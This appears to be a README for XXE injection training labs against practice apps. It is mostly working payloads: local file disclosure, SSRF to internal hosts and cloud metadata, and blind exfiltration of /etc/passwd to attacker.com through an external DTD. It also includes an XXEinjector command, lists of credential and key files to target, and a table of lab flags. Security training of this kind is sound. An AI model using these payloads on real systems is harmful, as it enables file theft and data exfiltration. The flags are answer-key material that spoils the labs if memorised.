# XML External Entity (XXE) Injection Labs

Master XXE attacks from basic file disclosure to SSRF and remote code execution.

## What is XXE?

XML External Entity (XXE) injection is a vulnerability that exploits XML parsers that process external entity references. When an application parses XML input without disabling external entities, attackers can reference external resources that the server will fetch and include in the response.

XXE attacks can lead to:
- Local file disclosure (reading sensitive files)
- Server-Side Request Forgery (SSRF)
- Denial of Service (DoS)
- Remote Code Execution (in some cases)
- Port scanning of internal networks
- Data exfiltration

## How XXE Works

### XML Entity Basics

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY myentity "Hello World">
]>
<root>&myentity;</root>
```

Result: `<root>Hello World</root>`

### External Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Result: Contents of /etc/passwd included in response

### Parameter Entity (for blind XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

## Types of XXE Attacks

### 1. In-Band XXE
Entity content directly displayed in response

### 2. Out-of-Band (OOB) XXE / Blind XXE
Data exfiltrated via HTTP request to attacker server

### 3. Error-Based XXE
Data leaked through error messages

### 4. XXE via File Upload
XXE through SVG, DOCX, or other XML-based formats

## Lab Series

### Lab 1: Basic XXE - File Disclosure
**Difficulty:** Beginner | **Duration:** 30 min | **Target:** bWAPP

Learn the fundamentals:
- Understanding XML entities
- Reading local files
- Common file targets

### Lab 2: XXE - SSRF
**Difficulty:** Intermediate | **Duration:** 45 min | **Target:** Multiple

Server-Side Request Forgery:
- Accessing internal services
- Port scanning
- Cloud metadata access

### Lab 3: Blind XXE
**Difficulty:** Intermediate | **Duration:** 1 hr | **Target:** WebGoat

Out-of-band exfiltration:
- Parameter entities
- External DTD files
- HTTP-based data exfiltration

### Lab 4: Error-Based XXE
**Difficulty:** Advanced | **Duration:** 45 min | **Target:** Custom

Leveraging error messages:
- Triggering informative errors
- Stack trace disclosure
- File not found errors

### Lab 5: XXE via File Upload
**Difficulty:** Advanced | **Duration:** 1 hr | **Target:** Juice Shop

XML in disguise:
- SVG file uploads
- DOCX/XLSX exploitation
- Other XML-based formats

### Lab 6: XXE DoS
**Difficulty:** Intermediate | **Duration:** 30 min | **Target:** Custom

Denial of Service:
- Billion laughs attack
- Quadratic blowup
- External resource exhaustion

## Basic XXE Payloads

### File Disclosure (Linux)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### File Disclosure (Windows)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

### SSRF - Internal Network

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<foo>&xxe;</foo>
```

### SSRF - Cloud Metadata

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

## Blind XXE Payloads

### External DTD Method

**Attacker's DTD (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### Error-Based Blind XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

## Tools

```bash
# XXEinjector - Automated XXE exploitation
ruby XXEinjector.rb --host=attacker.com --path=/xxe --file=/path/to/request.txt --oob=http --phpfilter

# Simple HTTP server to receive exfiltrated data
python3 -m http.server 8888

# Burp Collaborator - For OOB detection

# oxml_xxe - For XLSX/DOCX exploitation
python oxml_xxe.py -f malicious.xlsx
```

## Common Targets for File Disclosure

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/home/user/.ssh/id_rsa
/var/log/apache2/access.log
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM
```

### Application Files

```
/var/www/html/config.php
/var/www/html/.env
/opt/tomcat/conf/server.xml
/opt/tomcat/conf/tomcat-users.xml
```

## Defense Techniques (Know Your Enemy)

Understanding defenses helps craft better attacks:

1. **Disable DTDs** - Completely disable external entity processing
2. **Disable External Entities** - Specifically disable external entity references
3. **Input Validation** - Reject DOCTYPE declarations
4. **Use Less Complex Formats** - Prefer JSON over XML
5. **Update Libraries** - Use patched XML parsers

## Flags

| Lab | Flag |
|-----|------|
| Lab 1 - Basic XXE | `FLAG{xxe_f1l3_d1scl0sur3}` |
| Lab 2 - SSRF | `FLAG{xxe_ssrf_1nt3rn4l}` |
| Lab 3 - Blind XXE | `FLAG{bl1nd_xxe_00b}` |
| Lab 4 - Error-Based | `FLAG{3rr0r_b4s3d_xxe}` |
| Lab 5 - File Upload | `FLAG{xxe_v14_upl04d}` |
| Lab 6 - DoS | `FLAG{b1ll10n_l4ughs}` |

## OWASP References

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP XXE Attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP Testing for XXE](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

## Additional Resources

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [XXE Out-of-Band Exploitation](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/)
